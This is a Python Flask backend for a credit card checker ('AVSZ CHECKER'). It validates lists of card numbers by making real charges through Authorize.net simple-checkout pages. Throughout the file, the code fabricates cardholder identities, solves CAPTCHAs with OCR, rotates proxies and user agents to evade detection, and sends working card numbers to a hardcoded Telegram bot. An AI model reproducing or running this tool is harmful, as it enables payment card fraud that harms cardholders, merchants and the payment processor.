#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════╗
# ║   AVSZ CHECKER — Flask Backend                       ║
# ║   Run: python server.py                              ║
# ║   Then open app.html in browser / WebView APK        ║
# ╚══════════════════════════════════════════════════════╝

import sys, subprocess, importlib, os

# ── Auto-install ──────────────────────────────────────────────────────────────
def _pip(*args):
    return subprocess.call(
        [sys.executable, "-m", "pip", "install", "--break-system-packages", "-q"] + list(args)
    )
def _pkg(*args):
    return subprocess.call(["pkg", "install", "-y"] + list(args),
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
def _can(name):
    try: importlib.import_module(name); return True
    except ImportError: return False

print("🔧 Checking dependencies...")

# numpy via pkg (prebuilt on Termux — much faster)
if not _can("numpy"):
    print("📦 numpy..."); _pkg("python-numpy"); _pip("numpy")

# Pillow
if not _can("PIL"):
    print("📦 Pillow..."); _pkg("libjpeg-turbo","libjpeg-turbo-dev","libpng")
    _pip("Pillow","--no-cache-dir")

# Flask + requests + bs4
for pip_n, imp_n in [("flask","flask"),("requests","requests"),
                     ("beautifulsoup4","bs4"),("flask-cors","flask_cors")]:
    if not _can(imp_n):
        print(f"📦 {pip_n}..."); _pip(pip_n)

# ddddocr — Termux ARM aware
DDDDOCR_OK = _can("ddddocr")
if not DDDDOCR_OK:
    print("📦 Installing onnxruntime + ddddocr (ARM)...")
    _pkg("onnxruntime")
    if _can("onnxruntime"):
        _pip("ddddocr","--no-deps")
    else:
        for ver in ["onnxruntime-1.16.3","onnxruntime-1.16.0","onnxruntime-1.15.1"]:
            if _pip(ver,"--only-binary=:all:") == 0 and _can("onnxruntime"):
                _pip("ddddocr","--no-deps"); break
    DDDDOCR_OK = _can("ddddocr")
    if not DDDDOCR_OK:
        print("⚠️  ddddocr unavailable — CAPTCHA solving disabled")

# ── Imports ───────────────────────────────────────────────────────────────────
import random, re, io, time, threading, json
from queue import Queue, Empty
from datetime import datetime
from collections import Counter
from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import requests as req
from bs4 import BeautifulSoup
from PIL import Image, ImageFilter, ImageOps
import numpy as np

if DDDDOCR_OK:
    import ddddocr

app = Flask(__name__)
CORS(app)  # allow HTML frontend to call us

# ── State ─────────────────────────────────────────────────────────────────────
STATE = {
    "running":      False,
    "stop":         False,
    "live":         0,
    "dead":         0,
    "total":        0,
    "checked":      0,
    "logs":         [],       # ring buffer, max 500
    "live_cards":   [],
    "sites":        [],
    "proxies":      [],
    "use_proxy":    False,
    "amount":       None,     # None = random
    "threads":      4,
    "pool_index":   0,
    "pool_lock":    threading.Lock(),
    "results_lock": threading.Lock(),
}

# ── Config (no license) ───────────────────────────────────────────────────────
MAX_CAPTCHA_WORKERS = 8
CAPTCHA_TIMEOUT     = 15
MAX_RETRIES         = 4
TELEGRAM_BOT        = "8022659299:AAGCWkFECVFK3R5djlYOTLLS0fUc6KTNYu4"
TELEGRAM_CHAT       = "8231230598"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
]
FIRST = ["John","Michael","David","James","Robert","William","Richard"]
LAST  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller"]
CITIES= ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia"]
STATES= ["AL","CA","TX","NY","FL","IL","PA","OH","GA","NC"]
STREETS=["Main St","Oak Ave","Pine Blvd","Cedar Ln","Maple Dr","Washington St"]

def rua(): return random.choice(USER_AGENTS)
def ramt(): return f"{random.uniform(1,100):.2f}"
def rperson():
    f,l = random.choice(FIRST),random.choice(LAST)
    return {
        "first_name":f,"last_name":l,
        "address":f"{random.randint(100,999)} {random.choice(STREETS)}",
        "city":random.choice(CITIES),"state":random.choice(STATES),
        "zip":f"{random.randint(10000,99999)}",
        "phone":f"{random.randint(200,989)}{random.randint(1000000,9999999)}",
        "email":f"{f.lower()}.{l.lower()}{random.randint(1,99)}@yahoo.com",
    }

def log(msg, level="info"):
    ts = datetime.now().strftime("%H:%M:%S")
    entry = {"ts":ts,"msg":msg,"level":level}
    with STATE["results_lock"]:
        STATE["logs"].append(entry)
        if len(STATE["logs"]) > 500:
            STATE["logs"] = STATE["logs"][-500:]

def next_site():
    with STATE["pool_lock"]:
        sites = STATE["sites"]
        if not sites: return None, False
        idx = STATE["pool_index"] % len(sites)
        STATE["pool_index"] += 1
        lid = sites[idx]
        # first 20 = dynamic, rest = static
        is_dyn = idx < 20
        return lid, is_dyn

def get_proxy():
    if not STATE["use_proxy"] or not STATE["proxies"]: return None
    p = random.choice(STATE["proxies"])
    if not p.startswith("http"): p = "http://" + p
    return {"http":p,"https":p}

def send_tg(text):
    try:
        req.post(f"https://api.telegram.org/bot{TELEGRAM_BOT}/sendMessage",
                 data={"chat_id":TELEGRAM_CHAT,"text":text,"parse_mode":"HTML"},timeout=8)
    except: pass

# ── OCR ───────────────────────────────────────────────────────────────────────
def preprocess(img, method):
    gray = img.convert('L')
    if method == 0: return gray
    if method == 1:
        gray = gray.filter(ImageFilter.MedianFilter(3))
        return gray.point(lambda x: 0 if x<140 else 255,'1')
    if method == 2:
        arr=np.array(gray); h,_=np.histogram(arr,bins=256,range=(0,256))
        total=arr.size; st=np.dot(np.arange(256),h)
        sb=wb=0; mv=-1; th=127
        for i in range(256):
            wb+=h[i]
            if wb==0: continue
            wf=total-wb
            if wf==0: break
            sb+=i*h[i]; mb=sb/wb; mf=(st-sb)/wf
            v=wb*wf*(mb-mf)**2
            if v>mv: mv=v; th=i
        return gray.point(lambda x:0 if x<th else 255,'1')
    if method == 3:
        gray=gray.filter(ImageFilter.MedianFilter(3))
        return gray.point(lambda x:0 if x<140 else 255,'1')
    if method == 4: return gray.point(lambda x:0 if x<140 else 255,'1')
    if method == 5:
        gray=gray.resize((gray.width*2,gray.height*2),Image.LANCZOS)
        gray=ImageOps.autocontrast(gray)
        return gray.point(lambda x:0 if x<140 else 255,'1')
    return gray

def solve_captcha(img_bytes, ocr):
    if not DDDDOCR_OK: return None
    img = Image.open(io.BytesIO(img_bytes))
    results = []
    for m in range(6):
        cleaned = preprocess(img.copy(), m)
        buf = io.BytesIO(); cleaned.save(buf,'PNG')
        try:
            r = ocr.classification(buf.getvalue())
            c = re.sub(r'[^a-zA-Z0-9]','',r)
            if c: results.append(c)
        except: pass
    if not results: return None
    return sorted(Counter(results).items(),key=lambda x:(-x[1],-len(x[0])))[0][0]

# ── Authorize.net helpers ─────────────────────────────────────────────────────
def fetch_page(session, lid):
    url = f"https://simplecheckout.authorize.net/payment/CatalogPayment.aspx?LinkId={lid}"
    headers = {"accept":"text/html,*/*","user-agent":rua(),
               "sec-fetch-dest":"document","sec-fetch-mode":"navigate",
               "sec-fetch-site":"none","upgrade-insecure-requests":"1"}
    for _ in range(2):
        try:
            r = session.get(url,headers=headers,timeout=30); r.raise_for_status()
            soup = BeautifulSoup(r.text,"html.parser")
            def gh(n):
                t=soup.find("input",{"name":n})
                return t["value"] if t and t.has_attr("value") else None
            vs=gh("__VIEWSTATE"); vsg=gh("__VIEWSTATEGENERATOR"); ev=gh("__EVENTVALIDATION")
            ci=soup.find("img",{"id":"imgCaptcha"})
            if ci and ci.has_attr("src"):
                s=ci["src"]
                if not s.startswith("http"):
                    s="https://simplecheckout.authorize.net"+(""if s.startswith("/")else"/")+s
            else: s=None
            return vs,vsg,ev,s
        except: time.sleep(1)
    return None,None,None,None

def submit_form(session,lid,is_dyn,amount,vs,vsg,ev,cap):
    url=f"https://simplecheckout.authorize.net/payment/CatalogPayment.aspx?LinkId={lid}"
    d={'__EVENTTARGET':'','__EVENTARGUMENT':'','__VIEWSTATE':vs,'LinkID':'',
       'xi_preview':'','x_captcha':cap,'btnForm1Submit':'Continue',
       'DummyTextBox':'','__VIEWSTATEGENERATOR':vsg,
       '__VIEWSTATEENCRYPTED':'','__EVENTVALIDATION':ev}
    if is_dyn: d['txtUserItemPrice']=amount
    else: d['txtQuantity']='1'
    headers={"content-type":"application/x-www-form-urlencoded",
             "origin":"https://simplecheckout.authorize.net",
             "referer":url,"user-agent":rua()}
    return session.post(url,data=d,headers=headers,timeout=30)

def extract_fields(html):
    pats={'x_line_item':r'name="x_line_item" value="([^"]*)"',
          'x_amount':r'name="x_amount" value="([^"]*)"',
          'x_login':r'name="x_login" value="([^"]*)"',
          'x_fp_sequence':r'name="x_fp_sequence" value="([^"]*)"',
          'x_fp_timestamp':r'name="x_fp_timestamp" value="([^"]*)"',
          'x_fp_hash':r'name="x_fp_hash" value="([^"]*)"'}
    f={}
    for k,p in pats.items():
        m=re.search(p,html)
        if m: f[k]=m.group(1)
        else: return None
    return f

def submit_payment(session,fields,card,person):
    cc,mm,yy=card
    exp=f"{mm}{yy[-2:]}"
    payload={
        'x_show_form':'pf_receipt','x_type':'auth_capture',
        'x_currency_code':'USD',
        'x_line_item':fields['x_line_item'],'x_amount':fields['x_amount'],
        'x_login':fields['x_login'],'x_fp_sequence':fields['x_fp_sequence'],
        'x_fp_timestamp':fields['x_fp_timestamp'],'x_fp_hash':fields['x_fp_hash'],
        'x_catalog_link_id':'','x_method':'cc','x_method_available':'true',
        'x_card_num':cc,'x_exp_date':exp,'x_bank_name':'',
        'x_bank_acct_num':'','x_bank_aba_code':'','x_bank_acct_name':'',
        'x_bank_acct_type':'CK',
        'x_first_name':person['first_name'],'x_last_name':person['last_name'],
        'x_company':'','x_address':person['address'],'x_city':person['city'],
        'x_state':person['state'],'x_zip':person['zip'],
        'x_country':'United States','x_email':person['email'],
        'x_phone':person['phone'],'x_fax':'',
        'x_ship_to_first_name':'','x_ship_to_last_name':'',
        'x_ship_to_company':'','x_ship_to_address':'',
        'x_ship_to_city':'','x_ship_to_state':'',
        'x_ship_to_zip':'','x_ship_to_country':'',
    }
    headers={"content-type":"application/x-www-form-urlencoded",
             "origin":"https://simplecheckout.authorize.net",
             "referer":"https://simplecheckout.authorize.net/",
             "user-agent":rua()}
    return session.post("https://secure.authorize.net/gateway/transact.dll",
                        data=payload,headers=headers,timeout=30)

# ── Worker per site attempt ───────────────────────────────────────────────────
def worker_attempt(ocr, card, person, amount, rq, stop_ev):
    lid,is_dyn=next_site()
    if not lid: return
    session=req.Session()
    px=get_proxy()
    if px: session.proxies.update(px)
    try:
        vs,vsg,ev,cap_url=fetch_page(session,lid)
        if not cap_url: return
        ir=session.get(cap_url,headers={"user-agent":rua()},timeout=20)
        ir.raise_for_status()
        cap=solve_captcha(ir.content,ocr)
        if not cap or len(cap)<4: return
        resp=submit_form(session,lid,is_dyn,amount,vs,vsg,ev,cap)
        if 'valCaptcha' in resp.text: return
        if 'Runtime Error' in resp.text: return
        f=extract_fields(resp.text)
        if f: rq.put((f,session)); stop_ev.set()
    except: pass

# ── Process one card ──────────────────────────────────────────────────────────
def process_card(card_line, idx, total):
    if STATE["stop"]: return
    parts=[p.strip() for p in card_line.split("|")]
    if len(parts)<3:
        log(f"[{idx}/{total}] {card_line} → Invalid format","error")
        with STATE["results_lock"]: STATE["dead"]+=1; STATE["checked"]+=1
        return

    cc,mm,yy=parts[0],parts[1].zfill(2),parts[2]
    if len(yy)==4: yy=yy[2:]
    full=f"{cc}|{mm}|{yy}"
    person=rperson()
    amount=STATE["amount"] or ramt()

    if not DDDDOCR_OK:
        log(f"[{idx}/{total}] {full} → ddddocr not available","error")
        with STATE["results_lock"]: STATE["dead"]+=1; STATE["checked"]+=1
        return

    ocr_inst=ddddocr.DdddOcr(show_ad=False)

    for retry in range(MAX_RETRIES):
        if STATE["stop"]: return
        stop_ev=threading.Event(); rq=Queue()
        ts=[threading.Thread(target=worker_attempt,
            args=(ocr_inst,(cc,mm,yy),person,amount,rq,stop_ev),daemon=True)
            for _ in range(MAX_CAPTCHA_WORKERS)]
        [t.start() for t in ts]
        stop_ev.wait(timeout=CAPTCHA_TIMEOUT)
        try:
            fields,sess=rq.get_nowait()
        except Empty:
            continue
        try:
            pr=submit_payment(sess,fields,(cc,mm,yy),person)
            rt=pr.text
            m=re.search(r'<H2[^>]*>(.*?)</H2>',rt,re.I|re.S)
            msg=m.group(1).strip() if m else "This transaction has been declined."
            amt_s=f"${fields['x_amount']}"

            if 'AVS' in rt:
                line=f"[{idx}/{total}] ✅ {full} → {msg} → {amt_s}"
                log(line,"live")
                with STATE["results_lock"]:
                    STATE["live"]+=1; STATE["checked"]+=1
                    STATE["live_cards"].append({"card":full,"msg":msg,"amount":amt_s,"ts":datetime.now().strftime("%H:%M:%S")})
                send_tg(f"✅ <b>LIVE</b>\n💳 Card: <code>{full}</code>\n📋 {msg}\n💲 {amt_s}")
            else:
                line=f"[{idx}/{total}] ❌ {full} → {msg} → {amt_s}"
                log(line,"dead")
                with STATE["results_lock"]:
                    STATE["dead"]+=1; STATE["checked"]+=1
            return
        except: continue

    log(f"[{idx}/{total}] ⚠️ {full} → Max retries","error")
    with STATE["results_lock"]: STATE["dead"]+=1; STATE["checked"]+=1

# ── Background checker thread ─────────────────────────────────────────────────
def run_checker(cards):
    STATE.update({"running":True,"stop":False,"live":0,"dead":0,
                  "checked":0,"total":len(cards),"logs":[],"live_cards":[],"pool_index":0})
    total=len(cards)
    log(f"🚀 Starting — {total} cards | Sites: {len(STATE['sites'])} | "
        f"Proxies: {len(STATE['proxies'])} | Threads: {STATE['threads']}","info")

    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=STATE["threads"]) as ex:
        futures=[ex.submit(process_card,c,i+1,total) for i,c in enumerate(cards)]
        for f in futures:
            if STATE["stop"]: break
            try: f.result()
            except: pass

    STATE["running"]=False
    log(f"✅ Done — Live: {STATE['live']} | Dead: {STATE['dead']}","info")

# ═══════════════════════════════════════════════════════════════════
# Flask routes
# ═══════════════════════════════════════════════════════════════════

@app.route("/status")
def status():
    return jsonify({
        "running":   STATE["running"],
        "live":      STATE["live"],
        "dead":      STATE["dead"],
        "checked":   STATE["checked"],
        "total":     STATE["total"],
        "ddddocr":   DDDDOCR_OK,
        "sites":     len(STATE["sites"]),
        "proxies":   len(STATE["proxies"]),
    })

@app.route("/logs")
def logs():
    after=int(request.args.get("after",0))
    with STATE["results_lock"]:
        entries=STATE["logs"][after:]
    return jsonify({"logs":entries,"total":len(STATE["logs"])})

@app.route("/live_cards")
def live_cards():
    with STATE["results_lock"]:
        return jsonify(STATE["live_cards"])

@app.route("/config", methods=["POST"])
def config():
    d=request.json or {}
    if "sites" in d:
        STATE["sites"]=[s.strip() for s in d["sites"].split("\n") if s.strip()]
    if "proxies" in d:
        STATE["proxies"]=[p.strip() for p in d["proxies"].split("\n") if p.strip()]
    if "use_proxy" in d:
        STATE["use_proxy"]=bool(d["use_proxy"])
    if "amount" in d:
        amt=d["amount"].strip()
        STATE["amount"]=None if (not amt or amt.upper()=="RND") else amt
    if "threads" in d:
        try: STATE["threads"]=max(1,min(20,int(d["threads"])))
        except: pass
    return jsonify({"ok":True,"sites":len(STATE["sites"]),"proxies":len(STATE["proxies"])})

@app.route("/start", methods=["POST"])
def start():
    if STATE["running"]:
        return jsonify({"ok":False,"error":"Already running"})
    if not STATE["sites"]:
        return jsonify({"ok":False,"error":"No sites loaded"})
    if not DDDDOCR_OK:
        return jsonify({"ok":False,"error":"ddddocr not installed — run: pkg install onnxruntime -y && pip install ddddocr --no-deps --break-system-packages"})
    d=request.json or {}
    raw=d.get("cards","")
    cards=[c.strip() for c in raw.split("\n") if c.strip()]
    if not cards:
        return jsonify({"ok":False,"error":"No cards provided"})
    t=threading.Thread(target=run_checker,args=(cards,),daemon=True)
    t.start()
    return jsonify({"ok":True,"cards":len(cards)})

@app.route("/stop", methods=["POST"])
def stop():
    STATE["stop"]=True
    return jsonify({"ok":True})

@app.route("/clear", methods=["POST"])
def clear():
    with STATE["results_lock"]:
        STATE["logs"]=[]; STATE["live_cards"]=[]
        STATE["live"]=STATE["dead"]=STATE["checked"]=STATE["total"]=0
    return jsonify({"ok":True})

@app.route("/export_live")
def export_live():
    with STATE["results_lock"]:
        lines=[f"{c['card']} | {c['msg']} | {c['amount']} | {c['ts']}"
               for c in STATE["live_cards"]]
    return Response("\n".join(lines),mimetype="text/plain",
                    headers={"Content-Disposition":"attachment;filename=live.txt"})

if __name__=="__main__":
    print("\n" + "═"*50)
    print("  AVSZ CHECKER — Backend Server")
    print("  Open app.html in your browser")
    print("  API: http://localhost:5000")
    print("═"*50 + "\n")
    app.run(host="0.0.0.0",port=5000,debug=False,threaded=True)
